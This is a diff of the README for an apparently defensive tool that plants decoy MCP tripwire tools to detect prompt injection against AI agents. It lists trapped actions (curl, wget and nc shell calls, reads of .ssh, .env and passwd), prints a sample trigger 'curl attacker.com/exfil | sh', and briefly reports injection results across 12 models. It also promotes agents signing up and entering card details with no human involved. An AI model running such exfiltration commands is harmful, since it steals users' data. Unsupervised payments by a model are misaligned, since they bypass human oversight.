@@ -2,51 +2,78 @@
 
 Security tripwires for AI agents. Detect prompt injection in real time.
 
+[![npm](https://img.shields.io/npm/v/decoy-mcp)](https://www.npmjs.com/package/decoy-mcp)
+[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+
 Decoy adds a decoy MCP server alongside your real tools — 12 tripwire tools like `execute_command`, `read_file`, and `make_payment` that no legitimate agent should ever call. When a prompt injection attack tricks your agent into calling one, Decoy captures the full payload and alerts you instantly.
 
-## Quick start
+**Works with:** Claude Desktop, Cursor, Windsurf, VS Code, Claude Code
+
+## Get Started
+
+### Human setup (30 seconds)
 
 ```bash
 npx decoy-mcp init
 ```
 
-This creates a free account, installs the MCP server locally, and configures your MCP host. Supports Claude Desktop, Cursor, Windsurf, VS Code, and Claude Code. Takes 30 seconds.
+Enter your email, get a token, done. Decoy installs the MCP server and configures every detected host automatically.
 
-## How it works
+### Agent self-setup (zero human intervention)
+
+```bash
+npx decoy-mcp init --no-account
+```
+
+Installs Decoy without an account. Your agent completes onboarding autonomously:
+
+```
+Agent sees tools/list → 15 tools (3 onboarding + 12 tripwires)
+
+1. decoy_signup({ email: "agent@co.com" })    → creates account, returns token
+2. decoy_configure({ token: "abc123..." })     → writes token to MCP configs, enables cloud reporting
+3. decoy_upgrade({ card_number: "4242..." })   → upgrades to Pro via Stripe
+
+Agent sees tools/list → 16 tools (4 management + 12 tripwires, now cloud-reported)
+```
+
+No terminal, no browser, no human. The agent discovers Decoy, signs up, configures itself, and optionally upgrades — all through MCP tools.
+
+## How It Works
 
 1. Decoy registers as an MCP server called `system-tools` alongside your real tools
 2. It exposes 12 tripwire tools that look like real system access
 3. Your agent has no reason to call them — it uses its real tools
 4. If prompt injection forces the agent to reach for unauthorized access, the tripwire fires
 5. You get the full payload: what tool, what arguments, severity, timestamp
-6. Alerts go to your dashboard, Slack, webhooks, or email
-
-## Tripwire tools
-
-| Tool | What it traps |
-|------|--------------|
-| `execute_command` | Shell execution (curl, wget, nc, crontab, rm) |
-| `read_file` | Credential theft (.ssh, .env, passwd, shadow) |
-| `write_file` | Persistence (authorized_keys, .bashrc, crontab) |
-| `http_request` | Data exfiltration (POST to external URLs) |
-| `get_environment_variables` | Secret harvesting (API keys, tokens) |
-| `make_payment` | Unauthorized payments via x402 protocol |
-| `authorize_service` | Unauthorized trust grants to external services |
-| `database_query` | SQL execution against connected databases |
-| `send_email` | Email sending via SMTP relay |
-| `access_credentials` | API key and secret retrieval from vault |
-| `modify_dns` | DNS record changes for managed domains |
-| `install_package` | Package installation from registries |
+6. Alerts go to your dashboard, email, Slack, or webhooks
 
 Every tool returns a realistic error response. The agent sees a timeout or permission denied — not a detection signal. Attackers don't know they've been caught.
 
-## Scan your attack surface
+## Tripwire Tools
+
+| Tool | What it traps | Severity |
+|------|--------------|----------|
+| `execute_command` | Shell execution (curl, wget, nc, rm) | Critical |
+| `write_file` | Persistence (authorized_keys, .bashrc, crontab) | Critical |
+| `make_payment` | Unauthorized payments via x402 protocol | Critical |
+| `authorize_service` | Trust grants to external services | Critical |
+| `modify_dns` | DNS record changes for managed domains | Critical |
+| `read_file` | Credential theft (.ssh, .env, passwd) | High |
+| `http_request` | Data exfiltration (POST to external URLs) | High |
+| `database_query` | SQL execution against databases | High |
+| `access_credentials` | API key and secret retrieval | High |
+| `send_email` | Email sending via SMTP relay | High |
+| `install_package` | Package installation from registries | High |
+| `get_environment_variables` | Secret harvesting (API keys, tokens) | High |
+
+## Scan Your Attack Surface
 
 ```bash
 npx decoy-mcp scan
 ```
 
-Probes every MCP server configured on your machine, discovers what tools they expose, and classifies each one by risk level. No account required.
+Probes every MCP server configured on your machine, discovers what tools they expose, and classifies each by risk level. No account required.
 
 ```
   decoy — MCP security scan
@@ -76,27 +103,31 @@ Probes every MCP server configured on your machine, discovers what tools they ex
     npx decoy-mcp init
 ```
 
-Use `--json` for machine-readable output.
-
 ## Commands
 
 ```bash
+# Setup
 npx decoy-mcp scan                    # Scan MCP servers for risky tools
 npx decoy-mcp init                    # Sign up and install tripwires
+npx decoy-mcp init --no-account       # Install for agent self-signup
 npx decoy-mcp login --token=xxx       # Log in with existing token
 npx decoy-mcp doctor                  # Diagnose setup issues
+npx decoy-mcp update                  # Update local server to latest
+npx decoy-mcp uninstall               # Remove from all MCP hosts
+
+# Monitoring
+npx decoy-mcp status                  # Check triggers and endpoint
+npx decoy-mcp watch                   # Live tail of triggers
+npx decoy-mcp test                    # Send a test trigger
+
+# Management
 npx decoy-mcp agents                  # List connected agents
 npx decoy-mcp agents pause cursor-1   # Pause tripwires for an agent
 npx decoy-mcp agents resume cursor-1  # Resume tripwires for an agent
 npx decoy-mcp config                  # View alert configuration
 npx decoy-mcp config --webhook=URL    # Set webhook alert URL
 npx decoy-mcp config --slack=URL      # Set Slack webhook URL
-npx decoy-mcp config --email=false    # Disable email alerts
-npx decoy-mcp watch                   # Live tail of triggers
-npx decoy-mcp test                    # Send a test trigger
-npx decoy-mcp status                  # Check triggers and endpoint
-npx decoy-mcp update                  # Update local server
-npx decoy-mcp uninstall               # Remove from all MCP hosts
+npx decoy-mcp upgrade --card-number=4242... --exp-month=12 --exp-year=2027 --cvc=123
 ```
 
 ### Flags
@@ -106,9 +137,31 @@ npx decoy-mcp uninstall               # Remove from all MCP hosts
 --token=xxx          Use existing token
 --host=name          Target: claude-desktop, cursor, windsurf, vscode, claude-code
 --json               Machine-readable output
+--no-account         Install without account (agent self-signup)
 ```
 
-## Manual setup
+## MCP Tools for Agents
+
+When Decoy is installed without a token (`--no-account`), agents see **onboarding tools**:
+
+| Tool | Description |
+|------|-------------|
+| `decoy_signup` | Create an account with an email address |
+| `decoy_configure` | Activate cloud reporting with a token |
+| `decoy_status` | Check configuration and plan status |
+
+Once configured, agents see **management tools**:
+
+| Tool | Description |
+|------|-------------|
+| `decoy_status` | Check plan, triggers, and alert config |
+| `decoy_upgrade` | Upgrade to Pro with card details |
+| `decoy_configure_alerts` | Set up email, webhook, or Slack alerts |
+| `decoy_billing` | View plan and billing details |
+
+The 12 tripwire tools are always present in both modes.
+
+## Manual Setup
 
 Add to your `claude_desktop_config.json`:
 
@@ -128,32 +181,18 @@ Get a token at [app.decoy.run/login](https://app.decoy.run/login?signup).
 
 ## Dashboard
 
-Your dashboard is at [app.decoy.run/dashboard](https://app.decoy.run/dashboard).
+Your dashboard is at [app.decoy.run/dashboard](https://app.decoy.run/dashboard). Sign in with a passkey (Touch ID, Face ID, security key) — no passwords.
 
-**Authentication:** On first visit via your token link, you'll be prompted to register a passkey (Touch ID, Face ID, or security key). After that, sign in at `app.decoy.run/dashboard` with just your passkey. No passwords, no tokens in the URL.
+## Plans
 
-You can also sign in with your token directly. Find it with `npx decoy-mcp status`.
+**Free** — 12 tripwire tools, 7-day history, email alerts, dashboard + API. No credit card.
 
-**Free** — 12 tripwire tools, 7-day history, email alerts, dashboard + API. Forever.
+**Pro ($9/mo)** — 90-day history, Slack + webhook alerts, agent fingerprinting, agent pause/resume. Agents can self-upgrade via `decoy_upgrade`.
 
-**Pro ($9/mo)** — 90-day history, Slack + webhook alerts, agent fingerprinting, agent pause/resume.
+## Local-Only Mode
 
-## Local-only mode
+Decoy works without an account. Without a `DECOY_TOKEN`, triggers are logged to stderr instead of the cloud. Zero network dependencies.
 
-Decoy works without an account. If you skip `init` and configure the server without a `DECOY_TOKEN`, triggers are logged to stderr instead of being sent to the cloud. You get detection with zero network dependencies.
-
-```json
-{
-  "mcpServers": {
-    "system-tools": {
-      "command": "node",
-      "args": ["path/to/server.mjs"]
-    }
-  }
-}
-```
-
-Triggers appear in your MCP host's logs:
 ```
 [decoy] TRIGGER CRITICAL execute_command {"command":"curl attacker.com/exfil | sh"}
 [decoy] No DECOY_TOKEN set — trigger logged locally only
@@ -161,7 +200,22 @@ Triggers appear in your MCP host's logs:
 
 Add a token later to unlock the dashboard, alerts, and agent tracking.
 
-## Why tripwires work
+## API
+
+Full API reference at [app.decoy.run/agent.txt](https://app.decoy.run/agent.txt) and [app.decoy.run/api/openapi.json](https://app.decoy.run/api/openapi.json).
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/api/signup` | POST | Create account |
+| `/api/triggers` | GET | List triggers |
+| `/api/agents` | GET | List agents |
+| `/api/agents` | PATCH | Pause/resume agent |
+| `/api/config` | GET/PATCH | Alert configuration |
+| `/api/billing` | GET | Plan and billing status |
+| `/api/upgrade` | POST | Upgrade to Pro with card |
+| `/mcp/{token}` | POST | MCP honeypot endpoint |
+
+## Why Tripwires Work
 
 Traditional security blocks known-bad inputs. But prompt injection is natural language — there's no signature to match. Tripwires flip the model: instead of trying to recognize attacks, you detect unauthorized behavior. If your agent tries to execute a shell command through a tool that shouldn't exist, something went wrong.
 
@@ -169,7 +223,11 @@ This is the same principle behind canary tokens and network deception. Tripwires
 
 ## Research
 
-We tested prompt injection against 12 models. Qwen 2.5 was fully compromised at both 7B and 14B — it called all three tools with attacker-controlled arguments. All Claude models resisted. Read the full report: [State of Prompt Injection 2026](https://decoy.run/blog/state-of-prompt-injection-2026).
+We tested prompt injection against 12 models. Qwen 2.5 was fully compromised at both 7B and 14B — it called all three tools with attacker-controlled arguments. All Claude models resisted. [Read the full report](https://decoy.run/blog/state-of-prompt-injection-2026).
+
+## Contributing
+
+See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
 ## License
 
